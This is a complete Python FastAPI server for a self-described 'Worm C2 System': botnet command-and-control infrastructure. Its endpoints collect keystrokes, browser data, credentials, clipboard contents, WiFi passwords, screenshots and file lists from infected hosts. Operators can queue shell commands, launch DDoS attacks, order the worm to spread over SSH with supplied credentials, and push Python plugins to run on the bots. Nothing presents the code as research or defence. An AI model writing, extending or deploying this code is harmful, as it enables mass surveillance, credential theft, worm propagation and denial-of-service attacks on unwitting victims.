from fastapi import FastAPI, HTTPException, Depends, status, BackgroundTasks, UploadFile, File, Form
from fastapi.middleware.cors import CORSMiddleware
from fastapi.security import HTTPBasic, HTTPBasicCredentials
from fastapi.responses import HTMLResponse, FileResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from typing import List, Dict, Optional
import datetime
import random
import secrets
import os
import shutil
import json
import base64
import hashlib
import pickle
import time
import threading
from pathlib import Path

# ==================== RENDER CONFIGURATION ====================
# Environment variables (set in Render dashboard)
USERNAME = os.getenv("C2_USERNAME")
PASSWORD = os.getenv("C2_PASSWORD")
ENVIRONMENT = os.getenv("ENVIRONMENT", "development")
PORT = int(os.getenv("PORT", 5000))

# Data directories - Render has persistent disk at /var/data
DATA_DIR = "/var/data/worm_c2" if ENVIRONMENT == "production" else "./data"
os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(f"{DATA_DIR}/logs", exist_ok=True)
os.makedirs(f"{DATA_DIR}/plugins", exist_ok=True)
os.makedirs(f"{DATA_DIR}/screenshots", exist_ok=True)
os.makedirs(f"{DATA_DIR}/uploads", exist_ok=True)
os.makedirs(f"{DATA_DIR}/worm_versions", exist_ok=True)
os.makedirs("templates", exist_ok=True)

app = FastAPI(title="Worm C2 System", 
              description="Advanced Command & Control for Worm",
              version="2.0.0")

# Security
security = HTTPBasic()

def authenticate(credentials: HTTPBasicCredentials = Depends(security)):
    correct_username = secrets.compare_digest(credentials.username, USERNAME)
    correct_password = secrets.compare_digest(credentials.password, PASSWORD)
    if not (correct_username and correct_password):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid credentials",
            headers={"WWW-Authenticate": "Basic"},
        )
    return credentials.username

# CORS for frontend
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ==================== Data Models ====================
class KeystrokeReport(BaseModel):
    ip: str
    keystrokes: str
    hostname: Optional[str] = None
    username: Optional[str] = None
    os_info: Optional[str] = None
    importance: Optional[int] = 0
    encrypted: Optional[bool] = False
    timestamp: Optional[str] = None

class BrowserData(BaseModel):
    ip: str
    hostname: str
    username: str
    browser_data: str
    stats: dict
    timestamp: str

class CredentialReport(BaseModel):
    ip: str
    hostname: str
    username: str
    credentials: str
    count: int
    timestamp: str

class ClipboardReport(BaseModel):
    ip: str
    hostname: str
    username: str
    data: str
    priority: str
    timestamp: str

class WiFiReport(BaseModel):
    ip: str
    hostname: str
    username: str
    wifi_data: str
    count: int
    timestamp: str

class FileListReport(BaseModel):
    ip: str
    hostname: str
    username: str
    files: list
    count: int
    timestamp: str

class Heartbeat(BaseModel):
    ip: str
    hostname: str
    username: str
    status: str
    uptime: float
    timestamp: str

class CommandRequest(BaseModel):
    ip: str
    command: str
    is_terminal: bool = False

class TerminalCommand(BaseModel):
    command: str
    target_ips: Optional[List[str]] = None
    all_bots: bool = True

class PropagationCommand(BaseModel):
    target_range: str
    username: str
    password: str
    ssh_key: Optional[str] = None
    target_ips: Optional[List[str]] = None
    all_bots: bool = True

class DDoSCommand(BaseModel):
    target: str
    port: int = 80
    duration: int = 60
    method: str = "http"
    bots: Optional[List[str]] = None
    count: Optional[int] = None
    all_bots: bool = True

# ==================== File Storage with Persistence ====================
class PersistentStorage:
    """Handles persistent storage on Render's disk"""
    
    @staticmethod
    def save_json(filename, data):
        path = f"{DATA_DIR}/{filename}"
        with open(path, 'w') as f:
            json.dump(data, f)
    
    @staticmethod
    def load_json(filename, default=None):
        path = f"{DATA_DIR}/{filename}"
        if os.path.exists(path):
            with open(path, 'r') as f:
                return json.load(f)
        return default or {}
    
    @staticmethod
    def append_log(filename, entry):
        path = f"{DATA_DIR}/logs/{filename}"
        with open(path, 'a') as f:
            f.write(json.dumps(entry) + '\n')
    
    @staticmethod
    def read_logs(filename, limit=100):
        path = f"{DATA_DIR}/logs/{filename}"
        if os.path.exists(path):
            with open(path, 'r') as f:
                lines = f.readlines()[-limit:]
                return [json.loads(line) for line in lines]
        return []

# ==================== In-Memory Storage (with persistence) ====================
# Load from disk on startup
bots = PersistentStorage.load_json('bots.json', {})
plugins = PersistentStorage.load_json('plugins.json', {})
keystroke_logs = []  # Recent logs in memory
browser_logs = []
credential_logs = []
wifi_logs = []
file_logs = []
screenshot_logs = []
commands: Dict[str, List[dict]] = {}
terminal_outputs: Dict[str, List[str]] = {}

# ==================== Background Tasks ====================
def save_data_periodically():
    """Save data to disk every minute"""
    while True:
        time.sleep(60)
        try:
            PersistentStorage.save_json('bots.json', bots)
            PersistentStorage.save_json('plugins.json', plugins)
        except:
            pass

# Start background thread
if ENVIRONMENT == "production":
    thread = threading.Thread(target=save_data_periodically, daemon=True)
    thread.start()

# ==================== API Endpoints ====================

@app.get("/", response_class=HTMLResponse)
async def get_dashboard():
    try:
        with open("templates/index.html", "r") as f:
            return HTMLResponse(content=f.read())
    except:
        return HTMLResponse(content="<h1>Worm C2 Server</h1><p>Dashboard template not found</p>")

@app.get("/api/health")
async def health_check():
    """Health check endpoint for Render"""
    return {
        "status": "healthy",
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "bots": len(bots),
        "environment": ENVIRONMENT
    }

@app.get("/api/login-test")
async def login_test(username: str = Depends(authenticate)):
    return {"status": "authenticated", "username": username}

# ==================== Data Collection Endpoints ====================

@app.post("/api/report")
async def report_keystrokes(report: KeystrokeReport):
    """Receive keystrokes from worm."""
    log_entry = report.dict()
    keystroke_logs.append(log_entry)
    
    # Save to file
    PersistentStorage.append_log(f"keystrokes_{report.ip.replace('.', '_')}.log", log_entry)
    
    # Update bot info
    bots[report.ip] = {
        "last_seen": datetime.datetime.utcnow().isoformat(),
        "status": "active",
        "hostname": report.hostname,
        "username": report.username,
        "os_info": report.os_info,
        "first_seen": bots.get(report.ip, {}).get("first_seen", datetime.datetime.utcnow().isoformat())
    }
    
    # Keep logs manageable
    if len(keystroke_logs) > 10000:
        keystroke_logs.pop(0)
    
    return {"status": "ok"}

@app.post("/api/browser")
async def report_browser_data(data: BrowserData):
    """Receive browser data from worm."""
    entry = data.dict()
    browser_logs.append(entry)
    PersistentStorage.append_log(f"browser_{data.ip.replace('.', '_')}.log", entry)
    return {"status": "ok"}

@app.post("/api/credentials")
async def report_credentials(creds: CredentialReport):
    """Receive detected credentials."""
    entry = creds.dict()
    credential_logs.append(entry)
    PersistentStorage.append_log(f"credentials_{creds.ip.replace('.', '_')}.log", entry)
    return {"status": "ok"}

@app.post("/api/clipboard")
async def report_clipboard(clip: ClipboardReport):
    """Receive clipboard data."""
    # Just log to file
    PersistentStorage.append_log(f"clipboard_{clip.ip.replace('.', '_')}.log", clip.dict())
    return {"status": "ok"}

@app.post("/api/screenshot")
async def receive_screenshot(
    ip: str = Form(...),
    hostname: str = Form(...),
    username: str = Form(...),
    extracted_text: str = Form(...),
    priority: str = Form(...),
    timestamp: str = Form(...),
    screenshot: UploadFile = File(...)
):
    """Receive screenshot from worm."""
    # Save screenshot
    filename = f"{ip.replace('.', '_')}_{timestamp.replace(':', '-')}.png"
    filepath = f"{DATA_DIR}/screenshots/{filename}"
    
    content = await screenshot.read()
    with open(filepath, "wb") as f:
        f.write(content)
    
    screenshot_logs.append({
        "ip": ip,
        "hostname": hostname,
        "username": username,
        "filename": filename,
        "extracted_text": extracted_text[:200],
        "priority": priority,
        "timestamp": timestamp
    })
    
    return {"status": "ok"}

@app.post("/api/wifi")
async def report_wifi(wifi: WiFiReport):
    """Receive WiFi credentials."""
    entry = wifi.dict()
    wifi_logs.append(entry)
    PersistentStorage.append_log(f"wifi_{wifi.ip.replace('.', '_')}.log", entry)
    return {"status": "ok"}

@app.post("/api/files")
async def report_files(files: FileListReport):
    """Receive list of interesting files."""
    entry = files.dict()
    file_logs.append(entry)
    PersistentStorage.append_log(f"files_{files.ip.replace('.', '_')}.log", entry)
    return {"status": "ok"}

@app.post("/api/heartbeat")
async def heartbeat(hb: Heartbeat):
    """Receive heartbeat from worm."""
    if hb.ip in bots:
        bots[hb.ip]["last_seen"] = hb.timestamp
        bots[hb.ip]["status"] = "active"
    return {"status": "ok"}

@app.post("/api/terminal_output")
async def report_terminal_output(ip: str, output: str):
    """Receive terminal command output."""
    if ip not in terminal_outputs:
        terminal_outputs[ip] = []
    terminal_outputs[ip].append({
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "output": output
    })
    return {"status": "ok"}

# ==================== Command Endpoints ====================

@app.get("/api/commands")
async def get_commands(ip: str, last_command_id: Optional[int] = None):
    """Worm polls for commands."""
    if ip not in commands:
        return {"commands": []}
    
    all_cmds = commands.get(ip, [])
    if last_command_id:
        new_cmds = [cmd for cmd in all_cmds if cmd.get("id", 0) > last_command_id]
    else:
        new_cmds = all_cmds
    
    return {"commands": new_cmds}

@app.post("/api/commands")
async def issue_command(cmd_req: CommandRequest, username: str = Depends(authenticate)):
    """Issue command to specific bot."""
    cmd_id = int(datetime.datetime.utcnow().timestamp() * 1000)
    
    cmd_data = {
        "id": cmd_id,
        "command": cmd_req.command,
        "is_terminal": cmd_req.is_terminal,
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "issued_by": username
    }
    
    if cmd_req.ip not in commands:
        commands[cmd_req.ip] = []
    commands[cmd_req.ip].append(cmd_data)
    
    return {"status": "command queued", "command_id": cmd_id}

@app.post("/api/broadcast")
async def broadcast_command(cmd: TerminalCommand, username: str = Depends(authenticate)):
    """Broadcast command to multiple bots."""
    cmd_id = int(datetime.datetime.utcnow().timestamp() * 1000)
    
    # Get active bots
    now = datetime.datetime.utcnow()
    active_bots = []
    for ip, info in bots.items():
        last = datetime.datetime.fromisoformat(info["last_seen"])
        if (now - last).seconds < 300:
            active_bots.append(ip)
    
    target_bots = active_bots if cmd.all_bots else [ip for ip in cmd.target_ips if ip in active_bots]
    
    cmd_data = {
        "id": cmd_id,
        "command": cmd.command,
        "is_terminal": True,
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "issued_by": username
    }
    
    for ip in target_bots:
        if ip not in commands:
            commands[ip] = []
        commands[ip].append(cmd_data)
    
    return {
        "status": "broadcast sent",
        "bots_targeted": len(target_bots),
        "command_id": cmd_id
    }

@app.post("/api/ddos")
async def ddos_attack(ddos: DDoSCommand, username: str = Depends(authenticate)):
    """Launch DDoS attack."""
    cmd_id = int(datetime.datetime.utcnow().timestamp() * 1000)
    cmd_str = f"ddos:{ddos.target}:{ddos.port}:{ddos.duration}:{ddos.method}"
    
    # Get active bots
    now = datetime.datetime.utcnow()
    active_bots = []
    for ip, info in bots.items():
        last = datetime.datetime.fromisoformat(info["last_seen"])
        if (now - last).seconds < 300:
            active_bots.append(ip)
    
    target_bots = active_bots if ddos.all_bots else [ip for ip in ddos.bots if ip in active_bots]
    
    if ddos.count and ddos.count < len(target_bots):
        target_bots = random.sample(target_bots, ddos.count)
    
    cmd_data = {
        "id": cmd_id,
        "command": cmd_str,
        "is_terminal": False,
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "issued_by": username
    }
    
    for ip in target_bots:
        if ip not in commands:
            commands[ip] = []
        commands[ip].append(cmd_data)
    
    return {
        "status": "attack launched",
        "bots_used": len(target_bots),
        "total_active": len(active_bots)
    }

@app.post("/api/propagate")
async def propagate_worm(prop: PropagationCommand, username: str = Depends(authenticate)):
    """Command worms to spread via SSH."""
    cmd_id = int(datetime.datetime.utcnow().timestamp() * 1000)
    
    prop_data = {
        "target_range": prop.target_range,
        "ssh_username": prop.username,
        "ssh_password": prop.password,
        "ssh_key": prop.ssh_key
    }
    
    cmd_data = {
        "id": cmd_id,
        "command": f"propagate:{json.dumps(prop_data)}",
        "is_terminal": False,
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "issued_by": username
    }
    
    # Determine target bots
    now = datetime.datetime.utcnow()
    target_bots = []
    
    if prop.all_bots:
        for ip, info in bots.items():
            last = datetime.datetime.fromisoformat(info["last_seen"])
            if (now - last).seconds < 300:
                target_bots.append(ip)
    elif prop.target_ips:
        target_bots = [ip for ip in prop.target_ips if ip in bots]
    
    for ip in target_bots:
        if ip not in commands:
            commands[ip] = []
        commands[ip].append(cmd_data)
    
    return {
        "status": "propagation command sent",
        "bots_targeted": len(target_bots)
    }

@app.post("/api/upload_plugin")
async def upload_plugin(
    file: UploadFile = File(...),
    name: str = Form("custom_plugin"),
    version: str = Form("1.0.0"),
    description: str = Form(""),
    target_ips: Optional[str] = Form(None),
    all_bots: bool = Form(True),
    username: str = Depends(authenticate)
):
    """Upload plugin to run on bots."""
    plugin_filename = f"{name}_v{version}.py"
    plugin_path = f"{DATA_DIR}/plugins/{plugin_filename}"
    
    content = await file.read()
    with open(plugin_path, "wb") as f:
        f.write(content)
    
    plugins[name] = {
        "filename": plugin_filename,
        "version": version,
        "description": description,
        "uploaded": datetime.datetime.utcnow().isoformat(),
        "uploaded_by": username
    }
    
    PersistentStorage.save_json('plugins.json', plugins)
    
    cmd_id = int(datetime.datetime.utcnow().timestamp() * 1000)
    plugin_url = f"/plugins/{plugin_filename}"
    
    cmd_data = {
        "id": cmd_id,
        "command": f"run_plugin:{plugin_url}:{name}:{version}",
        "is_terminal": False,
        "plugin_name": name,
        "plugin_version": version,
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "issued_by": username
    }
    
    # Determine target bots
    now = datetime.datetime.utcnow()
    target_bots = []
    
    if all_bots:
        for ip, info in bots.items():
            last = datetime.datetime.fromisoformat(info["last_seen"])
            if (now - last).seconds < 300:
                target_bots.append(ip)
    elif target_ips:
        target_list = target_ips.split(',')
        target_bots = [ip for ip in target_list if ip in bots]
    
    for ip in target_bots:
        if ip not in commands:
            commands[ip] = []
        commands[ip].append(cmd_data)
    
    return {
        "status": "plugin uploaded",
        "plugin": name,
        "version": version,
        "bots_targeted": len(target_bots)
    }

@app.get("/plugins/{filename}")
async def get_plugin(filename: str):
    """Serve plugin files to bots."""
    file_path = f"{DATA_DIR}/plugins/{filename}"
    if os.path.exists(file_path):
        return FileResponse(file_path)
    return {"error": "Plugin not found"}

@app.post("/api/bot/self_destruct")
async def self_destruct(ip: str, username: str = Depends(authenticate)):
    """Send self-destruct command to a bot."""
    cmd_id = int(datetime.datetime.utcnow().timestamp() * 1000)
    cmd_data = {
        "id": cmd_id,
        "command": "self_destruct",
        "is_terminal": False,
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "issued_by": username
    }
    
    if ip not in commands:
        commands[ip] = []
    commands[ip].append(cmd_data)
    
    return {"status": f"Self-destruct signal sent to {ip}"}

# ==================== Dashboard Data Endpoints ====================

@app.get("/api/bots")
async def get_bots(username: str = Depends(authenticate)):
    now = datetime.datetime.utcnow()
    bot_list = []
    for ip, info in bots.items():
        last = datetime.datetime.fromisoformat(info["last_seen"])
        is_active = (now - last).seconds < 300
        bot_list.append({
            "ip": ip,
            "hostname": info.get("hostname", "unknown"),
            "username": info.get("username", "unknown"),
            "os_info": info.get("os_info", "unknown"),
            "last_seen": info["last_seen"],
            "first_seen": info.get("first_seen", info["last_seen"]),
            "status": "active" if is_active else "inactive"
        })
    return sorted(bot_list, key=lambda x: x["last_seen"], reverse=True)

@app.get("/api/keystrokes")
async def get_keystrokes(limit: int = 100, ip_filter: Optional[str] = None, username: str = Depends(authenticate)):
    if ip_filter:
        filtered = [log for log in keystroke_logs if log["ip"] == ip_filter]
    else:
        filtered = keystroke_logs
    return filtered[-limit:][::-1]

@app.get("/api/browser_data")
async def get_browser_data(limit: int = 50, username: str = Depends(authenticate)):
    return browser_logs[-limit:][::-1]

@app.get("/api/credentials")
async def get_credentials(limit: int = 50, username: str = Depends(authenticate)):
    return credential_logs[-limit:][::-1]

@app.get("/api/wifi_data")
async def get_wifi_data(limit: int = 50, username: str = Depends(authenticate)):
    return wifi_logs[-limit:][::-1]

@app.get("/api/files_data")
async def get_files_data(limit: int = 50, username: str = Depends(authenticate)):
    return file_logs[-limit:][::-1]

@app.get("/api/screenshots")
async def get_screenshots(limit: int = 20, username: str = Depends(authenticate)):
    return screenshot_logs[-limit:][::-1]

@app.get("/api/screenshot/{filename}")
async def get_screenshot(filename: str, username: str = Depends(authenticate)):
    file_path = f"{DATA_DIR}/screenshots/{filename}"
    if os.path.exists(file_path):
        return FileResponse(file_path)
    return {"error": "Not found"}

@app.get("/api/terminal_outputs")
async def get_terminal_outputs(ip: Optional[str] = None, username: str = Depends(authenticate)):
    if ip:
        return {ip: terminal_outputs.get(ip, [])}
    return terminal_outputs

@app.get("/api/plugins")
async def list_plugins(username: str = Depends(authenticate)):
    return plugins

@app.get("/api/stats")
async def get_stats(username: str = Depends(authenticate)):
    now = datetime.datetime.utcnow()
    active_bots = sum(1 for ip, info in bots.items() 
                     if (now - datetime.datetime.fromisoformat(info["last_seen"])).seconds < 300)
    
    return {
        "total_bots": len(bots),
        "active_bots": active_bots,
        "total_keystrokes": len(keystroke_logs),
        "total_browser": len(browser_logs),
        "total_credentials": len(credential_logs),
        "total_wifi": len(wifi_logs),
        "total_files": len(file_logs),
        "total_screenshots": len(screenshot_logs),
        "uptime": time.time(),
        "environment": ENVIRONMENT
    }

@app.get("/api/credentials")
async def get_creds(username: str = Depends(authenticate)):
    return {"username": USERNAME, "password": PASSWORD}

@app.post("/api/change_credentials")
async def change_credentials(
    new_username: str,
    new_password: str,
    username: str = Depends(authenticate)
):
    global USERNAME, PASSWORD
    USERNAME = new_username
    PASSWORD = new_password
    return {"status": "credentials updated"}

# ==================== Startup Banner ====================
@app.on_event("startup")
async def startup_event():
    print("\n" + "="*60)
    print("🚀 WORM C2 SERVER STARTED ON RENDER")
    print("="*60)
    print(f"📍 Environment: {ENVIRONMENT}")
    print(f"📍 Data Directory: {DATA_DIR}")
    print(f"🔑 Username: {USERNAME}")
    print(f"🔑 Password: {PASSWORD}")
    print(f"📊 Total Bots: {len(bots)}")
    print("="*60 + "\n")

